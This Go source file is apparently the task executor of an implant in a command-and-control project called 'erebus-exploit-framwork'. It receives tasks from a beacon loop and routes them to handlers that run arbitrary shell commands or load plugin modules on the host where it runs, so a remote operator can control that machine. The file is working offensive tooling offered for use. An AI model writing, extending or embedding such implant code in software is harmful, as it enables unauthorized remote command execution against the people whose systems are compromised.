package tasks

import (
	"context"
	"fmt"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"google.golang.org/protobuf/proto"
)

// Executor routes tasks to the appropriate handler.
type Executor struct {
	Registry *plugin.Registry
}

func NewExecutor(registry *plugin.Registry) *Executor {
	return &Executor{Registry: registry}
}

func (e *Executor) Execute(task *pb.Task) *pb.TaskResult {
	start := time.Now()

	var data []byte
	var err error

	ctx := context.Background()
	if task.TimeoutMs > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(task.TimeoutMs)*time.Millisecond)
		defer cancel()
	}

	switch task.TaskType {
	case pb.TaskType_TASK_SHELL:
		data, err = executeShell(ctx, task.Data)
	case pb.TaskType_TASK_EXIT:
		// Handled by beacon loop
		return &pb.TaskResult{
			TaskId:          task.TaskId,
			Success:         true,
			ExecutionTimeMs: time.Since(start).Milliseconds(),
		}
	case pb.TaskType_TASK_MODULE:
		data, err = e.executeModule(ctx, task.Data)
	default:
		err = fmt.Errorf("unsupported task type: %s", task.TaskType)
	}

	result := &pb.TaskResult{
		TaskId:          task.TaskId,
		Success:         err == nil,
		Data:            data,
		ExecutionTimeMs: time.Since(start).Milliseconds(),
	}
	if err != nil {
		result.Error = err.Error()
	}
	return result
}

func executeShell(ctx context.Context, data []byte) ([]byte, error) {
	shellTask := &pb.ShellTask{}
	if err := proto.Unmarshal(data, shellTask); err != nil {
		return nil, fmt.Errorf("unmarshal shell task: %w", err)
	}
	result := RunShell(ctx, shellTask.Command, shellTask.Args)
	return proto.Marshal(result)
}

func (e *Executor) executeModule(ctx context.Context, data []byte) ([]byte, error) {
	modTask := &pb.ModuleTask{}
	if err := proto.Unmarshal(data, modTask); err != nil {
		return nil, fmt.Errorf("unmarshal module task: %w", err)
	}
	return e.Registry.Execute(ctx, modTask.ModuleName, modTask.Config)
}
